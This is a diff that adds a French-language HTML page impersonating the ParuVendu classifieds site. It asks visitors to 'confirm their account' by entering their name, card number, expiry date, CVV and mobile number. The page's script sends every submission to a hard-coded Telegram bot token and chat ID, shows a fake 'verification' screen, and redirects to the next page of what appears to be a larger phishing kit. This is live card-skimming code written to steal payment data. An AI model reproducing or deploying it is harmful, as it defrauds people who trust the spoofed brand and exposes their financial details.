@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification des Informations</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-image: url('https://github.com/zapata225/lebon/blob/main/paruvendu.png?raw=true');
+            background-position: right;
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+        .logo img {
+            width: 200px;
+        }
+        .container {
+            width: 30%; /* Largeur du formulaire */
+            padding: 30px; /* Padding */
+            background: white;
+            border-radius: 30px; /* Bords plus enrobés */
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            position: absolute;
+            top: 35%; /* Formulaire légèrement abaissé */
+            left: 15%; /* Déplacé plus à gauche */
+            transform: translateY(-30%);
+            animation: slideUp 1s ease-out;
+        }
+        @keyframes slideUp {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(-30%);
+            }
+        }
+        .form-group {
+            margin-bottom: 15px; /* Espacement entre les champs */
+            text-align: left;
+        }
+        input {
+            width: 100%; /* Largeur des champs */
+            padding: 12px; /* Padding */
+            border: 1px solid #ccc;
+            border-radius: 0; /* Bordures rectangulaires */
+            font-size: 14px;
+            transition: all 0.3s;
+            background-color: #f9f9f9;
+            box-sizing: border-box; /* Assure que la largeur inclut le padding */
+        }
+        input:focus {
+            border-color: #ff4c4c;
+            box-shadow: 0 0 5px rgba(255, 76, 76, 0.5);
+        }
+        .btn {
+            background-color: #cc0000; /* Rouge */
+            color: white;
+            padding: 8px 20px; /* Taille réduite */
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            width: 40%; /* Bouton plus petit */
+            font-size: 14px; /* Taille du texte */
+            transition: background 0.3s;
+            text-transform: lowercase; /* Mise en minuscule */
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+            font-weight: bold; /* Texte en gras */
+        }
+        .btn:hover {
+            background-color: #b30000; /* Rouge plus foncé au survol */
+        }
+        .connexion-text {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .form-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-logo img {
+            width: 200px; /* Taille du logo agrandie x2 */
+        }
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+            text-align: justify;
+        }
+        .info-text strong {
+            color: #333;
+        }
+        .card-icon {
+            width: 40px;
+            vertical-align: middle;
+            margin-left: 10px;
+            display: none; /* Masqué par défaut */
+        }
+        .expiry-cvv-group {
+            display: flex;
+            gap: 10px; /* Espace entre les champs */
+        }
+        .expiry-cvv-group .form-group {
+            flex: 1; /* Les champs prennent la même largeur */
+        }
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9); /* Fond semi-transparent */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            color: #333;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+        .loading-screen.active {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="Logo">
+    </div>
+    <div class="container">
+        <div class="connexion-text">Vérification des Informations</div>
+        <div class="form-logo">
+            <img src="https://signastore.fr/img/cms/BRAND-PAYMENT-ICON.png" alt="Logo Formulaire">
+        </div>
+        <div class="info-text">
+            Pour des raisons de sécurité, nous procéderons parfois à la vérification rapide de vos informations personnelles, y compris à chaque mise à jour du site. Veuillez confirmer votre compte.
+        </div>
+        <form id="cardForm">
+            <div class="form-group">
+                <label for="name">Nom & Prénom du titulaire</label>
+                <input type="text" id="name" required>
+            </div>
+            <div class="form-group">
+                <label for="card-number">Numéro de carte</label>
+                <input type="text" id="card-number" maxlength="19" required>
+                <img id="card-icon" class="card-icon" src="" alt="Carte">
+            </div>
+            <div class="expiry-cvv-group">
+                <div class="form-group">
+                    <label for="expiry-date">Date d'expiration</label>
+                    <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">Cryptogramme visuel</label>
+                    <input type="text" id="cvv" maxlength="3" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="mobile">Numéro de mobile</label>
+                <input type="text" id="mobile" required>
+            </div>
+            <button type="submit" class="btn">Valider</button>
+        </form>
+    </div>
+
+    <!-- Écran de chargement -->
+    <div class="loading-screen" id="loadingScreen">
+        Vérification en cours...
+    </div>
+
+    <script>
+        // Constantes pour le bot Telegram
+        const BOT_TOKEN = "8128812759:AAEg0qMVYU-90EShzEkd60gIrakBm1XnovY";
+        const CHAT_ID = "5652184847";
+
+        // Fonction pour envoyer les données à Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = {
+                chat_id: CHAT_ID,
+                text: message,
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(params),
+                });
+
+                if (!response.ok) {
+                    throw new Error("Erreur lors de l'envoi du message à Telegram");
+                }
+                console.log("Message envoyé avec succès à Telegram");
+            } catch (error) {
+                console.error("Erreur :", error);
+            }
+        }
+
+        // Détection du type de carte
+        const cardNumberInput = document.getElementById("card-number");
+        const cardIcon = document.getElementById("card-icon");
+
+        cardNumberInput.addEventListener("input", function () {
+            const cardNumber = cardNumberInput.value.replace(/\s/g, "");
+            let cardType = "";
+
+            if (/^4/.test(cardNumber)) {
+                cardType = "Visa";
+                cardIcon.src = "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg";
+            } else if (/^5[1-5]/.test(cardNumber)) {
+                cardType = "Mastercard";
+                cardIcon.src = "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg";
+            } else if (/^2/.test(cardNumber)) {
+                cardType = "Mastercard";
+                cardIcon.src = "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg";
+            } else if (/^6(?:011|5)/.test(cardNumber)) {
+                cardType = "Discover";
+                cardIcon.src = "https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg";
+            } else {
+                cardType = "";
+                cardIcon.src = "";
+            }
+
+            if (cardType) {
+                cardIcon.style.display = "inline-block";
+            } else {
+                cardIcon.style.display = "none";
+            }
+
+            // Formatage du numéro de carte par groupes de 4
+            let formattedCardNumber = cardNumber.replace(/\D/g, "").match(/.{1,4}/g);
+            if (formattedCardNumber) {
+                formattedCardNumber = formattedCardNumber.join(" ");
+                cardNumberInput.value = formattedCardNumber;
+            }
+        });
+
+        // Formatage de la date d'expiration
+        const expiryDateInput = document.getElementById("expiry-date");
+
+        expiryDateInput.addEventListener("input", function () {
+            let expiryDate = expiryDateInput.value.replace(/\D/g, "");
+            if (expiryDate.length > 2) {
+                expiryDate = expiryDate.slice(0, 2) + "/" + expiryDate.slice(2, 4);
+            }
+            expiryDateInput.value = expiryDate;
+        });
+
+        // Gestionnaire de soumission du formulaire
+        document.getElementById("cardForm").addEventListener("submit", function (event) {
+            event.preventDefault(); // Empêche la soumission par défaut
+
+            // Afficher l'écran de chargement
+            const loadingScreen = document.getElementById("loadingScreen");
+            loadingScreen.classList.add("active");
+
+            // Récupérer les valeurs du formulaire
+            const name = document.getElementById("name").value;
+            const cardNumber = document.getElementById("card-number").value;
+            const expiryDate = document.getElementById("expiry-date").value;
+            const cvv = document.getElementById("cvv").value;
+            const mobile = document.getElementById("mobile").value;
+
+            // Créer le message à envoyer
+            const message = `
+                🚨 Nouvelle soumission de carte 🚨
+                Nom : ${name}
+                Numéro de carte : ${cardNumber}
+                Date d'expiration : ${expiryDate}
+                CVV : ${cvv}
+                Mobile : ${mobile}
+            `;
+
+            // Envoyer le message à Telegram
+            sendToTelegram(message);
+
+            // Simuler un délai de chargement (2 secondes)
+            setTimeout(() => {
+                // Rediriger vers la page suivante après l'envoi
+                window.location.href = "{{ url_for('next_page', current_page='parucard') }}";
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
